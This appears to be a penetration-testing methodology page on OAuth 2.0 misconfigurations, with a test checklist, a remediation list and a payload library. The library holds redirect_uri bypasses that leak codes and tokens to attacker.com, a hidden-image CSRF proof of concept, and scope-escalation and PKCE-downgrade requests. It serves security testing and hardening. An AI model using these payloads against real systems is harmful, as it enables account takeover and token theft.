---
title: "OAuth 2.0 Misconfigurations"
date: 2026-02-24
draft: false
---

# OAuth 2.0 Misconfigurations

> **Severity**: Critical | **CWE**: CWE-601, CWE-346, CWE-287
> **OWASP**: A07:2021 – Identification and Authentication Failures

---

## What Is OAuth 2.0?

OAuth 2.0 is an authorization framework that lets third-party applications access resources on behalf of a user without exposing credentials. Key flows:

```
Authorization Code Flow (most common, most secure):
  1. App redirects user → Authorization Server with client_id, redirect_uri, scope, state
  2. User authenticates → AS redirects back with ?code=AUTH_CODE&state=...
  3. App exchanges code for access_token (server-to-server, with client_secret)
  4. App uses access_token to query Resource Server

Implicit Flow (legacy, token in URL fragment — mostly deprecated):
  → Access token delivered directly in redirect URL

Client Credentials (machine-to-machine, no user):
  → client_id + client_secret → access_token

Resource Owner Password (deprecated, legacy):
  → username + password directly to token endpoint
```

---

## Discovery Checklist

- [ ] Find authorization endpoint: `/oauth/authorize`, `/authorize`, `/auth`, `/.well-known/openid-configuration`
- [ ] Find token endpoint: `/oauth/token`, `/token`
- [ ] Check `redirect_uri` validation — wildcard, partial match, path bypass
- [ ] Check `state` parameter — missing, static, predictable
- [ ] Test PKCE bypass (Authorization Code with PKCE)
- [ ] Test `response_type` manipulation (code→token, etc.)
- [ ] Test token endpoint for client auth weaknesses (no secret required)
- [ ] Check access token scope escalation
- [ ] Check token leakage in Referer, logs, URL parameters
- [ ] Test account linking/pre-linking CSRF
- [ ] Test implicit flow token theft via open redirect
- [ ] Check for `/.well-known/oauth-authorization-server` or `/.well-known/openid-configuration`
- [ ] Review `scope` parameter for privilege escalation
- [ ] Test authorization code reuse (should be single-use)

---

## Payload Library

### Attack 1 — `redirect_uri` Bypass

```bash
# Strict match bypass — add trailing slash or path component:
# Registered: https://app.com/callback
https://app.com/callback/
https://app.com/callback/extra
https://app.com/callback%0d%0a
https://app.com/callback%2f..%2fattacker

# Query string append (if server checks prefix only):
https://app.com/callback?next=https://attacker.com

# Fragment bypass:
https://app.com/callback#https://attacker.com

# Path traversal out of registered path:
# Registered: https://app.com/oauth/callback
https://app.com/oauth/callback/../../../attacker-path

# Subdomain wildcards — if registered *.app.com:
https://attacker.app.com/callback

# URL parser confusion (duplicate host):
https://app.com@attacker.com/callback
https://attacker.com#app.com/callback

# Full open redirect chain:
# 1. Find open redirect on app.com: /redirect?url=https://attacker.com
# 2. Register redirect_uri as: https://app.com/redirect?url=https://attacker.com
# 3. Auth code leaks via Referer to attacker.com

# Craft full attack URL:
https://authorization-server.com/authorize?
  client_id=APP_CLIENT_ID&
  response_type=code&
  redirect_uri=https://app.com/redirect?url=https://attacker.com&
  scope=profile+email&
  state=STOLEN_STATE
```

### Attack 2 — Missing / Predictable `state` Parameter (CSRF on OAuth)

```bash
# Check if state is missing:
GET /authorize?client_id=X&redirect_uri=https://app.com/cb&response_type=code&scope=email
# → No state= parameter → CSRF-based account hijack possible

# If state is predictable (sequential, timestamp):
# Monitor multiple auth flows → detect pattern

# CSRF attack — force victim to link attacker's account:
# 1. Attacker starts OAuth flow, gets state+code from own account
# 2. Attacker builds URL: /callback?code=ATTACKER_CODE&state=...
# 3. Attacker tricks victim into visiting that URL
# 4. Victim's session gets linked to attacker's OAuth identity

# PoC page:
<img src="https://app.com/oauth/callback?code=ATTACKER_AUTH_CODE" width=0 height=0>
```

### Attack 3 — Authorization Code Interception (Implicit Flow)

```bash
# Implicit flow: token delivered in URL fragment → leaks via Referer, history, logs

# If app uses response_type=token (implicit):
https://as.com/authorize?client_id=X&response_type=token&redirect_uri=https://app.com/cb

# Steal token via open redirect in redirect_uri:
https://as.com/authorize?
  client_id=X&
  response_type=token&
  redirect_uri=https://app.com/redir?goto=https://attacker.com

# Token in fragment: https://attacker.com#access_token=TOKEN&token_type=bearer
# Attacker JS reads location.hash → steals token

# Force implicit flow even if app uses code flow:
# Change response_type=code to response_type=token
# If AS allows both → token in URL, no code exchange needed
```

### Attack 4 — Scope Escalation

```bash
# Request more scopes than application intended:
# Registered scopes: profile email
# Try adding: admin write delete openid

https://as.com/authorize?
  client_id=LEGITIMATE_APP_ID&
  response_type=code&
  redirect_uri=https://app.com/callback&
  scope=profile+email+admin+write

# If AS doesn't validate scope against client registration → escalated token

# Try undocumented scopes:
scope=profile
scope=profile email admin
scope=openid profile email phone address
scope=offline_access              # get refresh token
scope=https://graph.microsoft.com/.default   # Azure AD full access

# Use legitimate client_id with expanded scope — token issued to legitimate app
# but contains elevated permissions not intended for that client

# GraphQL-style scope: some APIs use resource-based scopes
scope=read:users write:users delete:users admin:org
```

### Attack 5 — Authorization Code Reuse

```bash
# Authorization codes must be single-use. Test reuse:
# 1. Complete OAuth flow → capture code from redirect
# 2. Re-submit same code:
POST /oauth/token HTTP/1.1
Host: as.com
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&
code=AUTH_CODE_JUST_USED&
redirect_uri=https://app.com/callback&
client_id=CLIENT_ID&
client_secret=CLIENT_SECRET

# If reuse works → token issued twice → code theft attack viable
```

### Attack 6 — Token Leakage via Referer

```bash
# Authorization code in URL gets logged in:
# - Browser history
# - Server access logs
# - Referer header to next page's external resources (scripts, images, trackers)

# Test: after OAuth callback (URL has ?code=...), check:
# - Does page load external resources (scripts, images)?
# - Is Referer header sent with those requests?
# → Referer contains auth code → any external origin sees it

# Intercept with Burp and check outgoing Referer headers after /callback

# For implicit flow: fragment (#access_token=...) is not sent in Referer
# But single-page apps often pass it via postMessage or XHR → check JS handling
```

### Attack 7 — Account Pre-Linking / Takeover

```bash
# Scenario: App allows "link your Google account"
# Attack: Pre-link victim's email to attacker's account before victim registers

# 1. Attacker registers with victim@gmail.com (if email not verified)
# 2. OR: attacker uses CSRF to link OAuth account to existing target account
# 3. Victim later registers/links → attacker already has access

# Also: OAuth account takeover via email collision:
# If IDP A and IDP B both return same email → app merges accounts
# Register on IDP A with victim@gmail.com (unverified allowed)
# Victim registers directly with password → attacker's OAuth links to it

# Check: does app require email verification before OAuth account linking?
# Does app match accounts by email across different OAuth providers?
```

### Attack 8 — PKCE Bypass

```bash
# PKCE (Proof Key for Code Exchange) — S256 or plain challenge
# code_verifier → SHA256 → base64url → code_challenge

# If server accepts plain method (no hash):
# code_challenge = code_verifier (same value)
# If server doesn't validate method: submit without code_verifier in exchange

# Intercept authorization request:
GET /authorize?
  code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM&
  code_challenge_method=S256&
  ...

# Manipulate to plain:
code_challenge_method=plain
code_challenge=<plaintext_verifier>

# Skip PKCE in token exchange:
POST /token
grant_type=authorization_code&code=CODE&redirect_uri=URI
# Omit code_verifier entirely → if server doesn't enforce it
```

---

## Tools

```bash
# OAuth 2.0 testing with Burp Suite:
# - Extension: "OAuth Scan" (BApp Store)
# - Extension: "CSRF Scanner" for state check
# - Repeater: replay auth codes, modify scope, test redirect_uri

# Manual token decode:
echo "ACCESS_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# oauth2-proxy fuzzing:
# Test redirect_uri with ffuf:
ffuf -u "https://as.com/authorize?client_id=X&redirect_uri=FUZZ&response_type=code" \
  -w redirect_uri_payloads.txt

# Check .well-known:
curl -s https://target.com/.well-known/openid-configuration | python3 -m json.tool
curl -s https://target.com/.well-known/oauth-authorization-server | python3 -m json.tool

# Find OAuth endpoints via JS source:
grep -r "oauth\|authorize\|redirect_uri\|client_id" js/ --include="*.js"

# jwt_tool for inspecting tokens:
python3 jwt_tool.py ACCESS_TOKEN

# Test scope explosion — pass all known OAuth scopes:
scope=openid+profile+email+phone+address+offline_access+admin+write+read+delete
```

---

## Remediation Reference

- **Strict `redirect_uri` validation**: exact match only, no wildcard, no path prefix matching
- **Enforce `state` parameter**: cryptographically random, bound to session, validated on return
- **Single-use authorization codes**: invalidate after first use, short TTL (< 60 seconds)
- **PKCE required** for public clients and mobile apps — reject `plain` method
- **Scope allowlist per client**: don't let clients request scopes beyond registration
- **Bind access tokens to client**: verify `client_id` on every token introspection
- **Never include tokens in URLs**: use POST body or Authorization header only
- **Verify email before account linking/merging** across OAuth providers

*Part of the Web Application Penetration Testing Methodology series.*
